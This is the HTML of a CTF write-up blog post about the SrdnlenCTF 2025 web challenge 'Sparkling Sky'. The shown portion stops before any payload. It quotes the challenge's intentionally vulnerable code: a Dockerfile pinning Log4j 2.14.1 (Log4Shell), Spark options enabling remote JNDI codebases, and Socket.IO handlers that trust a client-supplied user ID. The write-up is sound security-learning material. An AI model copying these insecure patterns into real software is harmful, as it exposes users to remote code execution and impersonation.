@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>🌐 Sparkling Sky - mH4ck3r0n3&#39;s Blog</title><script src="https://cdn.jsdelivr.net/npm/fuse.js@6.4.6/dist/fuse.min.js"></script>
+<meta name="Description" content="A detailed write-up of the Web challenge &#39;Sparkling Sky&#39; from SrdnlenCTF - 2025"><meta property="og:url" content="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/">
+  <meta property="og:site_name" content="mH4ck3r0n3&#39;s Blog">
+  <meta property="og:title" content="🌐 Sparkling Sky">
+  <meta property="og:description" content="A detailed write-up of the Web challenge &#39;Sparkling Sky&#39; from SrdnlenCTF - 2025">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-05T21:54:05+01:00">
+    <meta property="article:modified_time" content="2025-02-05T21:54:05+01:00">
+    <meta property="article:tag" content="⚠️ CVE-2021-44228 (Log4Shell)">
+    <meta property="article:tag" content="📜 Log4j">
+    <meta property="article:tag" content="🌐 Web Security">
+    <meta property="og:image" content="https://mh4ck3r0n3.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://mh4ck3r0n3.github.io/logo.png">
+  <meta name="twitter:title" content="🌐 Sparkling Sky">
+  <meta name="twitter:description" content="A detailed write-up of the Web challenge &#39;Sparkling Sky&#39; from SrdnlenCTF - 2025">
+<meta name="application-name" content="mH4ck3r0n3&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="mH4ck3r0n3&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/" /><link rel="prev" href="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><meta name="google-site-verification" content="Z-UoSLcRkeqd45L7xfo6KhHLAHRigsRvXpv1cYBypy4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "🌐 Sparkling Sky",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mh4ck3r0n3.github.io\/posts\/2025\/02\/05\/sparkling-sky\/"
+        },"genre": "posts","keywords": "⚠️ CVE-2021-44228 (Log4Shell), 📜 Log4j, 🌐 Web Security","wordcount":  1216 ,
+        "url": "https:\/\/mh4ck3r0n3.github.io\/posts\/2025\/02\/05\/sparkling-sky\/","datePublished": "2025-02-05T21:54:05+01:00","dateModified": "2025-02-05T21:54:05+01:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mH4ck3r0n3"
+            },"description": "A detailed write-up of the Web challenge 'Sparkling Sky' from SrdnlenCTF - 2025"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="mH4ck3r0n3&#39;s Blog"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-2" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><a class="menu-item" href="/about/" title="About Me"> About Me </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="mH4ck3r0n3&#39;s Blog"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-3" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a class="menu-item" href="/about/" title="About Me">About Me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">🌐 Sparkling Sky</h1><h2 class="single-subtitle">A detailed write-up of the Web challenge &#39;Sparkling Sky&#39; from SrdnlenCTF - 2025</h2><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://mh4ck3r0n3.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mH4ck3r0n3</a></span><span class="post-category"><a href="/categories/ethical-hacking/ctfs/jeopardy/srdnlenctf-2025/web/">
+                                    <i class="far fa-folder fa-fw" aria-hidden="true"></i> Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web
+                                </a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="05/02/2025">05/02/2025</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1216 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#-challenge-overview">📊 Challenge Overview</a></li>
+        <li><a href="#-challenge-information">📝 Challenge Information</a></li>
+        <li><a href="#-challenge-files--infrastructure">🎯 Challenge Files &amp; Infrastructure</a>
+          <ul>
+            <li><a href="#provided-files">Provided Files</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-initial-analysis">🔍 Initial Analysis</a>
+      <ul>
+        <li><a href="#first-steps">First Steps</a></li>
+        <li><a href="#-vulnerability-analysis">🔬 Vulnerability Analysis</a>
+          <ul>
+            <li><a href="#potential-vulnerabilities">Potential Vulnerabilities</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-solution-path">🎯 Solution Path</a>
+      <ul>
+        <li><a href="#exploitation-steps">Exploitation Steps</a>
+          <ul>
+            <li><a href="#initial-setup">Initial setup</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-exploitation-process">🛠️ Exploitation Process</a>
+      <ul>
+        <li><a href="#approach">Approach</a></li>
+      </ul>
+    </li>
+    <li><a href="#-flag-capture">🚩 Flag Capture</a></li>
+    <li><a href="#-tools-used">🔧 Tools Used</a></li>
+    <li><a href="#-technical-deep-dive">📈 Technical Deep Dive</a>
+      <ul>
+        <li><a href="#vulnerability-details">Vulnerability Details</a></li>
+        <li><a href="#mitigation-strategies">Mitigation Strategies</a></li>
+      </ul>
+    </li>
+    <li><a href="#-key-learnings">💡 Key Learnings</a>
+      <ul>
+        <li><a href="#new-knowledge">New Knowledge</a></li>
+        <li><a href="#skills-improved">Skills Improved</a></li>
+      </ul>
+    </li>
+    <li><a href="#-references--resources">📚 References &amp; Resources</a>
+      <ul>
+        <li><a href="#official-documentation">Official Documentation</a></li>
+        <li><a href="#learning-resources">Learning Resources</a></li>
+      </ul>
+    </li>
+    <li><a href="#-final-statistics">📊 Final Statistics</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><figure><a class="lightgallery" href="/images/SrdnlenCTF-2025/SparklingSky/challenge_presentation.png" title="Challenge Presentation" data-thumbnail="/images/SrdnlenCTF-2025/SparklingSky/challenge_presentation.png" data-sub-html="<h2>Challenge Presentation</h2><p>Challenge Presentation</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/SrdnlenCTF-2025/SparklingSky/challenge_presentation.png"
+            data-srcset="/images/SrdnlenCTF-2025/SparklingSky/challenge_presentation.png, /images/SrdnlenCTF-2025/SparklingSky/challenge_presentation.png 1.5x, /images/SrdnlenCTF-2025/SparklingSky/challenge_presentation.png 2x"
+            data-sizes="auto"
+            alt="/images/SrdnlenCTF-2025/SparklingSky/challenge_presentation.png" />
+    </a><figcaption class="image-caption">Challenge Presentation</figcaption>
+    </figure></p>
+<h2 id="-challenge-overview">📊 Challenge Overview</h2>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Details</th>
+<th>Additional Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>🏆 Event</td>
+<td>SrdnlenCTF - 2025</td>
+<td><a href="https://ctf.srdnlen.it/challenges#challenge-24" target="_blank" rel="noopener noreffer ">Event Link</a></td>
+</tr>
+<tr>
+<td>🔰 Category</td>
+<td>Web</td>
+<td>🌐</td>
+</tr>
+<tr>
+<td>💎 Points</td>
+<td>500</td>
+<td>Out of XXXX total</td>
+</tr>
+<tr>
+<td>⭐ Difficulty</td>
+<td>🟡 Medium</td>
+<td>Personal Rating: 5/10</td>
+</tr>
+<tr>
+<td>👤 Author</td>
+<td>sanmatte</td>
+<td><a href="" rel="">Profile</a></td>
+</tr>
+<tr>
+<td>🎮 Solves</td>
+<td>49</td>
+<td>XX% solve rate</td>
+</tr>
+<tr>
+<td>📅 Date</td>
+<td>19-01-2025</td>
+<td>SrdnlenCTF - 2025 Day X</td>
+</tr>
+<tr>
+<td>🦾 Solved By</td>
+<td>devgianlu</td>
+<td>Team: Team Aetruria</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h2 id="-challenge-information">📝 Challenge Information</h2>
+<blockquote>
+<p>I am developing a game with websockets in python. I left my pc to a java fan, I think he really messed up.  It is forbidden to perform or attempt to perform any action against the infrastructure or the challenge itself.</p>
+<ul>
+<li>username: user1337</li>
+<li>password: user1337</li>
+</ul>
+<p>website: <a href="http://sparklingsky.challs.srdnlen.it:8081" target="_blank" rel="noopener noreffer ">http://sparklingsky.challs.srdnlen.it:8081</a></p>
+</blockquote>
+<h2 id="-challenge-files--infrastructure">🎯 Challenge Files &amp; Infrastructure</h2>
+<h3 id="provided-files">Provided Files</h3>
+<blockquote>
+<p>Files: None</p>
+<ul>
+<li><a href="https://drive.google.com/file/d/1cyxG-664HNH09s_-QHxbwPqf7kNqJ2t4/view?usp=drive_link" target="_blank" rel="noopener noreffer "><i class="far fa-file-archive fa-fw" aria-hidden="true"></i>&nbsp;Attached Files</a></li>
+</ul>
+</blockquote>
+<h1 id="-initial-analysis">🔍 Initial Analysis</h1>
+<h2 id="first-steps">First Steps</h2>
+<blockquote>
+<p>Initially, the website appears as follows:</p>
+<p><figure><a class="lightgallery" href="/images/SrdnlenCTF-2025/SparklingSky/site_presentation.png" title="Site Presentation" data-thumbnail="/images/SrdnlenCTF-2025/SparklingSky/site_presentation.png" data-sub-html="<h2>Site Presentation</h2><p>Site Presentation</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/SrdnlenCTF-2025/SparklingSky/site_presentation.png"
+            data-srcset="/images/SrdnlenCTF-2025/SparklingSky/site_presentation.png, /images/SrdnlenCTF-2025/SparklingSky/site_presentation.png 1.5x, /images/SrdnlenCTF-2025/SparklingSky/site_presentation.png 2x"
+            data-sizes="auto"
+            alt="/images/SrdnlenCTF-2025/SparklingSky/site_presentation.png" />
+    </a><figcaption class="image-caption">Site Presentation</figcaption>
+    </figure></p>
+<p>By entering the login credentials specified in the challenge description, we are redirected to this page:</p>
+<p><figure><a class="lightgallery" href="/images/SrdnlenCTF-2025/SparklingSky/play.png" title="Play" data-thumbnail="/images/SrdnlenCTF-2025/SparklingSky/play.png" data-sub-html="<h2>Play</h2><p>Play</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/SrdnlenCTF-2025/SparklingSky/play.png"
+            data-srcset="/images/SrdnlenCTF-2025/SparklingSky/play.png, /images/SrdnlenCTF-2025/SparklingSky/play.png 1.5x, /images/SrdnlenCTF-2025/SparklingSky/play.png 2x"
+            data-sizes="auto"
+            alt="/images/SrdnlenCTF-2025/SparklingSky/play.png" />
+    </a><figcaption class="image-caption">Play</figcaption>
+    </figure></p>
+<p>From here, every time I clicked on play, nothing happened; only the access number in the queue changed. For this reason, I decided to read the attached files, and the first thing that caught my eye was the <code>log4j.properties</code> file. From there, I realized it was using Log4j, so I went to check the installed version in the <code>Dockerfile</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="cl"><span class="k">RUN</span> <span class="nb">cd</span> <span class="k">$(</span>python -c <span class="s2">&#34;import os, pyspark; print(os.path.dirname(pyspark.__file__))&#34;</span><span class="k">)</span>/jars <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    rm log4j* <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-slf4j-impl/2.14.1/log4j-slf4j-impl-2.14.1.jar <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-1.2-api/2.14.1/log4j-1.2-api-2.14.1.jar<span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see, the version is <code>2.14.1</code>. Searching online, this version is vulnerable to <code>CVE-2021-44228</code>. Now we just need to figure out how to send the payload to exploit it. Continuing to read, I noticed in the <code>anticheat.py</code> file the use of <code>spark</code> and <code>log4j</code>, so I understood that the game&rsquo;s anticheat system needed to be triggered in some way to exploit the vulnerability:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">log4j_config_path</span> <span class="o">=</span> <span class="s2">&#34;log4j.properties&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">spark</span> <span class="o">=</span> <span class="n">SparkSession</span><span class="o">.</span><span class="n">builder</span> \
+</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="n">appName</span><span class="p">(</span><span class="s2">&#34;Anticheat&#34;</span><span class="p">)</span> \
+</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="s2">&#34;spark.driver.extraJavaOptions&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:&#34;</span> <span class="o">+</span> <span class="n">log4j_config_path</span><span class="p">)</span> \
+</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="s2">&#34;spark.executor.extraJavaOptions&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:&#34;</span> <span class="o">+</span> <span class="n">log4j_config_path</span><span class="p">)</span> \
+</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="n">getOrCreate</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">logger</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">_jvm</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">log4j</span><span class="o">.</span><span class="n">LogManager</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s2">&#34;Anticheat&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Continuing to read the files, I noticed that the browser and server also communicate via Socket.IO. However, if we examine the <code>socket.py</code> file, we see that there is no input validation. Even though our account is just a spectator, we can call any function. The <code>handle_bird_movement</code> function, although it uses the user ID, does not take it from cookies. It retrieves it from user-controlled input, so we can provide any ID we want, whether it belongs to a player or a spectator:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init_socket_events</span><span class="p">(</span><span class="n">socketio</span><span class="p">,</span> <span class="n">players</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@socketio.on</span><span class="p">(</span><span class="s1">&#39;connect&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nd">@login_required</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">handle_connect</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">current_user</span><span class="o">.</span><span class="n">get_id</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log_action</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="s2">&#34;is connecting&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_id</span> <span class="ow">in</span> <span class="n">players</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># Player already exists, send their current position</span>
+</span></span><span class="line"><span class="cl">            <span class="n">emit</span><span class="p">(</span><span class="s1">&#39;connected&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">:</span> <span class="n">players</span><span class="p">[</span><span class="n">user_id</span><span class="p">][</span><span class="s1">&#39;x&#39;</span><span class="p">],</span> <span class="s1">&#39;y&#39;</span><span class="p">:</span> <span class="n">players</span><span class="p">[</span><span class="n">user_id</span><span class="p">][</span><span class="s1">&#39;y&#39;</span><span class="p">],</span> <span class="s1">&#39;angle&#39;</span><span class="p">:</span> <span class="n">players</span><span class="p">[</span><span class="n">user_id</span><span class="p">][</span><span class="s1">&#39;angle&#39;</span><span class="p">]})</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># TODO: Check if the lobby is full and add the player to the queue</span>
+</span></span><span class="line"><span class="cl">            <span class="n">log_action</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;is spectating&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span><span class="p">(</span><span class="s1">&#39;update_bird_positions&#39;</span><span class="p">,</span> <span class="n">players</span><span class="p">,</span> <span class="n">broadcast</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@socketio.on</span><span class="p">(</span><span class="s1">&#39;move_bird&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nd">@login_required</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">handle_bird_movement</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user_id</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user_id&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_id</span> <span class="ow">in</span> <span class="n">players</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">del</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">players</span><span class="p">[</span><span class="n">user_id</span><span class="p">]</span> <span class="o">!=</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">with</span> <span class="n">lock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">players</span><span class="p">[</span><span class="n">user_id</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;x&#39;</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;y&#39;</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;y&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;color&#39;</span><span class="p">:</span> <span class="s1">&#39;black&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;angle&#39;</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;angle&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">analyze_movement</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">],</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;y&#39;</span><span class="p">],</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;angle&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">log_action</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;was cheating with final position (</span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;y&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">) and final angle: </span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;angle&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="c1"># del players[user_id] # Remove the player from the game - we are in beta so idc</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">emit</span><span class="p">(</span><span class="s1">&#39;update_bird_positions&#39;</span><span class="p">,</span> <span class="n">players</span><span class="p">,</span> <span class="n">broadcast</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@socketio.on</span><span class="p">(</span><span class="s1">&#39;disconnect&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nd">@login_required</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">handle_disconnect</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user_id</span> <span class="o">=</span> <span class="n">current_user</span><span class="o">.</span><span class="n">get_id</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_id</span> <span class="ow">in</span> <span class="n">players</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">del</span> <span class="n">players</span><span class="p">[</span><span class="n">user_id</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span><span class="p">(</span><span class="s1">&#39;update_bird_positions&#39;</span><span class="p">,</span> <span class="n">players</span><span class="p">,</span> <span class="n">broadcast</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
